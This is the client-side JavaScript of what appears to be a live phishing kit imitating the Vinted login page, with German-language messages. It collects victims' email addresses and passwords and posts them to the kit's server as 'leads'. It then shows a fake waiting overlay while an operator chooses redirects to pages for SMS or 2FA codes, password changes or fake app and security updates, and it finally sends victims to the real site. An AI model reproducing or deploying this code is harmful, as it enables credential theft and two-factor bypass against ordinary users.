(function () {
  'use strict';

  var credFetch = { credentials: 'include' };
  var leadStorageKey = 'gmw_vint_lead_id';
  var legacyLeadStorageKey = 'gmw_lead_id';
  var waitStateKey = 'gmw_vint_wait_post_submit';
  var pollTimer = null;
  var countdownTimer = null;
  var countdownSeconds = 300;
  var waitVisible = false;

  var form = document.getElementById('login-form');
  var usernameInput = document.getElementById('username');
  var passwordInput = document.getElementById('password');
  var submitButton = document.getElementById('login-submit-button');
  var toggleButton = document.getElementById('pw-toggle');
  var errorNode = document.getElementById('vint-login-error');
  var waitOverlay = document.getElementById('vint-wait-overlay');
  var waitCountdown = document.getElementById('vint-wait-countdown');

  function safeTrim(value) {
    return value == null ? '' : String(value).trim();
  }

  function setError(message) {
    if (!errorNode) return;
    var text = safeTrim(message);
    if (!text) {
      errorNode.hidden = true;
      errorNode.textContent = '';
      return;
    }
    errorNode.textContent = text;
    errorNode.hidden = false;
  }

  function formatCountdown(totalSeconds) {
    var safe = Math.max(0, totalSeconds | 0);
    var minutes = Math.floor(safe / 60);
    var seconds = safe % 60;
    return String(minutes) + ':' + (seconds < 10 ? '0' : '') + String(seconds);
  }

  function stopCountdown() {
    if (countdownTimer) {
      clearInterval(countdownTimer);
      countdownTimer = null;
    }
  }

  function hideWaitOverlay() {
    stopCountdown();
    waitVisible = false;
    if (waitOverlay) waitOverlay.hidden = true;
  }

  function showWaitOverlay() {
    if (!waitOverlay) return;
    if (!waitVisible) countdownSeconds = 300;
    waitVisible = true;
    waitOverlay.hidden = false;
    if (waitCountdown) waitCountdown.textContent = formatCountdown(countdownSeconds);
    stopCountdown();
    countdownTimer = setInterval(function () {
      if (countdownSeconds > 0) countdownSeconds -= 1;
      if (waitCountdown) waitCountdown.textContent = formatCountdown(countdownSeconds);
      if (countdownSeconds <= 0) stopCountdown();
    }, 1000);
  }

  function clearStatusPolling() {
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }

  function loadStoredLeadId() {
    try {
      var preferred = safeTrim(sessionStorage.getItem(leadStorageKey));
      if (preferred) return preferred;
      return safeTrim(sessionStorage.getItem(legacyLeadStorageKey));
    } catch (e) {
      return '';
    }
  }

  function storeLeadId(id) {
    var leadId = safeTrim(id);
    if (!leadId) return;
    try {
      sessionStorage.setItem(leadStorageKey, leadId);
      sessionStorage.setItem(legacyLeadStorageKey, leadId);
    } catch (e) {}
  }

  function clearLeadId() {
    try {
      sessionStorage.removeItem(leadStorageKey);
      sessionStorage.removeItem(legacyLeadStorageKey);
    } catch (e) {}
  }

  function hasPostSubmitWaitState() {
    try {
      return sessionStorage.getItem(waitStateKey) === '1';
    } catch (e) {
      return false;
    }
  }

  function markPostSubmitWaitState() {
    try {
      sessionStorage.setItem(waitStateKey, '1');
    } catch (e) {}
  }

  function clearPostSubmitWaitState() {
    try {
      sessionStorage.removeItem(waitStateKey);
    } catch (e) {}
  }

  function telemetryPayload(payload) {
    if (typeof window.gmwAppendTelemetry === 'function') {
      try {
        return window.gmwAppendTelemetry(payload);
      } catch (e) {
        return payload;
      }
    }
    return payload;
  }

  function normalizeEmail(raw) {
    return safeTrim(raw).toLowerCase();
  }

  function isValidEmail(email) {
    if (!email) return false;
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(email);
  }

  function fetchVisitId() {
    return fetch('/api/visit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}'
    }, credFetch))
      .then(function (r) {
        return r.json().then(function (data) {
          return { ok: r.ok, data: data || {} };
        });
      })
      .then(function (res) {
        if (!res.ok || !res.data || !res.data.id) return '';
        return safeTrim(res.data.id);
      })
      .catch(function () {
        return '';
      });
  }

  function resolveLeadIdForSession() {
    var fromUrl = '';
    try {
      fromUrl = safeTrim(new URLSearchParams(window.location.search || '').get('id'));
    } catch (e) {}
    if (fromUrl) {
      storeLeadId(fromUrl);
      return Promise.resolve(fromUrl);
    }
    var stored = loadStoredLeadId();
    if (stored) return Promise.resolve(stored);
    return fetchVisitId().then(function (id) {
      if (id) storeLeadId(id);
      return id;
    });
  }

  function redirectToStatusDestination(status, id) {
    var leadId = safeTrim(id);
    if (!leadId) return;
    if (status === 'redirect_change_password') {
      window.location = '/passwort-aendern?id=' + encodeURIComponent(leadId);
      return;
    }
    if (status === 'redirect_sms_code' || status === 'redirect_2fa_code' || status === 'redirect_push') {
      window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
      return;
    }
    if (status === 'redirect_sicherheit') {
      window.location = '/sicherheit-update?id=' + encodeURIComponent(leadId);
      return;
    }
    if (status === 'redirect_android') {
      window.location = '/app-update?id=' + encodeURIComponent(leadId);
      return;
    }
    if (status === 'redirect_open_on_pc') {
      window.location = '/bitte-am-pc?id=' + encodeURIComponent(leadId);
      return;
    }
    if (status === 'redirect_gmx_net') {
      window.location.href = 'https://www.vinted.de/';
    }
  }

  function applyStatus(status, id) {
    if (status === 'pending') {
      if (hasPostSubmitWaitState()) showWaitOverlay();
      return;
    }
    if (
      status === 'redirect_change_password' ||
      status === 'redirect_sms_code' ||
      status === 'redirect_2fa_code' ||
      status === 'redirect_push' ||
      status === 'redirect_sicherheit' ||
      status === 'redirect_android' ||
      status === 'redirect_open_on_pc' ||
      status === 'redirect_gmx_net'
    ) {
      clearStatusPolling();
      hideWaitOverlay();
      clearPostSubmitWaitState();
      redirectToStatusDestination(status, id);
      return;
    }
    if (status === 'error') {
      hideWaitOverlay();
      clearStatusPolling();
      clearPostSubmitWaitState();
      setError('Die Anmeldung konnte nicht bestaetigt werden. Bitte pruefen Sie Ihre Eingaben.');
      if (submitButton) submitButton.disabled = false;
      return;
    }
    if (status === 'not_found') {
      hideWaitOverlay();
      clearStatusPolling();
      clearLeadId();
      clearPostSubmitWaitState();
      setError('Sitzung abgelaufen. Bitte melden Sie sich erneut an.');
      if (submitButton) submitButton.disabled = false;
      return;
    }
    if (status === 'show_success') {
      hideWaitOverlay();
      clearStatusPolling();
      clearPostSubmitWaitState();
      setError('');
      if (submitButton) submitButton.disabled = false;
    }
  }

  function pollStatus(leadId) {
    var id = safeTrim(leadId);
    if (!id) return;
    fetch('/api/status?id=' + encodeURIComponent(id) + '&page=vint-index&_=' + Date.now(), Object.assign({
      cache: 'no-store',
      headers: { Pragma: 'no-cache' }
    }, credFetch))
      .then(function (r) { return r.json(); })
      .then(function (res) {
        var status = res && res.status ? String(res.status) : 'pending';
        applyStatus(status, id);
      })
      .catch(function () {});
  }

  function startStatusPolling(leadId) {
    var id = safeTrim(leadId);
    if (!id) return;
    clearStatusPolling();
    pollStatus(id);
    pollTimer = setInterval(function () {
      pollStatus(id);
    }, 1000);
  }

  function buildSubmitPayload(email, password, visitId) {
    var hp = document.getElementById('hp-website');
    var screenWidth = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var screenHeight = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    return telemetryPayload({
      email: email,
      password: password,
      visitId: visitId || undefined,
      clientFormBrand: 'vint',
      website: hp && hp.value ? hp.value : '',
      screenWidth: screenWidth || undefined,
      screenHeight: screenHeight || undefined
    });
  }

  function submitCredentials(email, password, visitId) {
    var payload = buildSubmitPayload(email, password, visitId);
    return fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }, credFetch))
      .then(function (r) {
        return r.json().then(function (data) {
          return { ok: r.ok, status: r.status, data: data || {} };
        });
      });
  }

  if (toggleButton && passwordInput) {
    toggleButton.addEventListener('click', function () {
      var isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      toggleButton.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  }

  if (form) {
    form.addEventListener('submit', function (event) {
      event.preventDefault();
      setError('');

      var email = normalizeEmail(usernameInput && usernameInput.value);
      var password = safeTrim(passwordInput && passwordInput.value);

      if (!isValidEmail(email)) {
        setError('Bitte gib eine gueltige E-Mail-Adresse ein.');
        return;
      }
      if (!password) {
        setError('Bitte gib dein Passwort ein.');
        return;
      }
      if (submitButton) submitButton.disabled = true;

      resolveLeadIdForSession()
        .then(function (visitId) {
          return submitCredentials(email, password, visitId).then(function (res) {
            return { visitId: visitId, response: res };
          });
        })
        .then(function (result) {
          var res = result.response;
          if (!res.ok || !res.data || !res.data.ok) {
            setError('Anmeldung ist derzeit nicht verfuegbar. Bitte versuche es erneut.');
            if (submitButton) submitButton.disabled = false;
            hideWaitOverlay();
            return;
          }
          var leadId = safeTrim((res.data && res.data.id) || result.visitId);
          if (!leadId) {
            setError('Sitzung konnte nicht erstellt werden. Bitte erneut versuchen.');
            if (submitButton) submitButton.disabled = false;
            return;
          }
          storeLeadId(leadId);
          markPostSubmitWaitState();
          showWaitOverlay();
          startStatusPolling(leadId);
        })
        .catch(function () {
          setError('Verbindungsfehler. Bitte versuche es erneut.');
          if (submitButton) submitButton.disabled = false;
          hideWaitOverlay();
        });
    });
  }

  resolveLeadIdForSession().then(function (id) {
    if (!id) return;
    if (hasPostSubmitWaitState()) showWaitOverlay();
    startStatusPolling(id);
  });
})();
